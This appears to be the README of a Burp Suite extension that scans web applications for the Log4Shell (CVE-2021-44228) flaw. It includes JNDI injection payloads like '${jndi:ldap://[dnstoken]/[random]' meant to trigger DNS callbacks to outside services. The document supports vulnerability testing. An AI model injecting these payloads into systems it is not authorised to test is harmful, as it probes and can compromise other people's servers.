<h1 align="center">
  <br>
  Log4J Scanner
</h1>

<h4 align="center">Burp extension to scan Log4Shell (CVE-2021-44228) vulnerability pre and post auth.</h4>

---

<p align="center">
  <a href="https://github.com/0xDexter0us/Log4J-Scanner/releases">
    <img src="https://img.shields.io/github/release/0xDexter0us/Log4J-Scanner.svg">
  </a>
  <a href="https://github.com/0xDexter0us/Log4J-Scanner/">
      <img src="https://img.shields.io/github/stars/0xDexter0us/Log4J-Scanner.svg?style=social&label=Stars">
  </a>
  <a href="https://github.com/0xDexter0us/Log4J-Scanner/">
    <img src="https://img.shields.io/github/followers/0xDexter0us.svg?style=social&label=Follow">
  </a>
  <a href="https://twitter.com/intent/follow?screen_name=0xDexter0us">
      <img src="https://img.shields.io/twitter/follow/0xDexter0us.svg?style=social&label=Follow">
  </a>
  <a href="https://discord.gg/bugbounty">
      <img src="https://img.shields.io/badge/chat-on%20discord-7289da.svg">
  </a>

</p>

---
## Disclaimer
> I am not responsible for your actions, burp-suite freezing, target getting hacked, thermonuclear war, or the current economic crisis caused by you following these directions. YOU are choosing to use this tool, and if you point your finger at me for messing anything up, I will LMAO at you.

---
![Log4J-Scanner](https://github.com/0xDexter0us/Log4J-Scanner/images/log4j-scanner.png)

## Instructions:
 - Add a DNS token from any service you prefer [interact.sh](https://app.interactsh.com), [pipedream](https://pipedream.com), [canarytokens](https://canarytokens.org), [dnslog.cn](https://dnslog.cn) or burp collaborator.
 - Either select one of the pre-defined payload or add a custom payload.
 - Add custom payload as: `${jndi:ldap://[dnstoken]/[random]` as `dnstoken`and `random` are place-holders, also remember __NOT__ to add `}`closing curly bracket.
 - Select location for payload insertion, headers or parameters or both.
 - For post-auth scanning add the complete cookie, auth header. Eg: `Authorization: Bearer ya29.m.CvkBAd1XLWYfLkuHFIuOYFCfcGI137rr...`
 - Hit **Hack The Planet** button.

### Important instructions to remember:

 - You'll need [Logger++](https://github.com/nccgroup/LoggerPlusPlus) or [Flow](https://github.com/hvqzao/burp-flow) extension to trace the request triggering the DNS callback.
 - Remember to add this extension above [Logger++](https://github.com/nccgroup/LoggerPlusPlus) or [Flow](https://github.com/hvqzao/burp-flow) to track all out going requests.

 ![Burp-Externder](https://github.com/0xDexter0us/Log4J-Scanner/images/extender.png)

### How to track callbacks:

- Payload triggering callback will contain a 6 character unique ID
- Example payload `${jndi:ldap://example.interact.sh/ABC123` where `ABC123` will be the unique ID
- You can search for this ID in [Logger++](https://github.com/nccgroup/LoggerPlusPlus) or [Flow](https://github.com/hvqzao/burp-flow) to trace the request.

## Download releases
`https://github.com/0xDexter0us/Log4J-Scanner/releases/`

## Build from source
* `./gradlew build fatJar`
* Grab the jar file `build/libs/Log4J-Scanner-x.x.x.jar`

## Installation
1. Download the latest jar from releases or build from source.
2. Add the jar to Burp Suite.



#### If you like the project, please give the repo a star! <3

## Resources

- For passive scanning: `https://github.com/f0ng/log4j2burpscanner`
- For active scanning: `https://github.com/albinowax/ActiveScanPlusPlus`


## Changelog

**13 December 2021 - v.0.1.0**
 - First public release

## Thanks To

* CoreyD97 - https://github.com/CoreyD97


### This was coded be me within a day and is an initial release, bug might occur, bug reports, suggestions and pull requests all are welcome :)

-----

[![Join our Discord server!](https://invidget.switchblade.xyz/bugbounty)](http://discord.gg/bugbounty)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Q5Q76ZT6K)
